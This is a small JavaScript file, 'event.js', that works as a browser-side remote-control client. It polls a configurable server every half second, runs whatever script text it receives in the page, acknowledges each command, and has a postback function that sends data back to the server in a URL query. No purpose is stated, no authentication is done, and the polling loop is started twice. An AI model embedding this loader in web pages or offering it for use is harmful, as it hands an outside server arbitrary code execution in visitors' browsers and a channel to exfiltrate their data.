/*
 
 event.js v3.0 by Gydo Kosten, march 20, 2017.
 
 
*/

//config
var host = "127.0.0.1";







//define vars
var eventSave = event;


//define functions
function executeScript(data) {
var execScript = document.createElement("script");
execScript.type = "text/javascript";
execScript.id = "executeScript";
execScript.innerHTML = data;
document.head.appendChild(execScript);
execScript.parentNode.removeChild(execScript);
console.log("executeScript("+data+")");
}





function execute() {
var script = document.createElement("script");
script.src = "http://" + host + "/event.txt";
script.type = "text/javascript";
script.id = "getDataScript";
document.head.appendChild(script);

    console.log("Running if loop");
    console.log("event = " + event + ", eventSave = " + eventSave);
if(event != "" && event != eventSave) {
	executeScript(event);
    eventSave = event;
    console.log("ACKing");
	ack();
    
    
}
script.parentNode.removeChild(script);

}
function ack() {
var ack = document.createElement("script");
ack.src = "http://" + host + "/ack.php";
ack.type = "text/javascript";
document.head.appendChild(ack);
console.log("ACKed.");
ack.parentNode.removeChild(ack);
console.log("ACK script removed.");
}
function postback(data){
var pbRq = document.createElement("script");
pbRq.src = "http://" + host + "/post.php?postback=" + data;
pbRq.type = "text/javascript";
document.head.appendChild(pbRq);
}

function start() {
return setInterval(function(){execute()},500);
}

start();
var start_status = start();
execute();
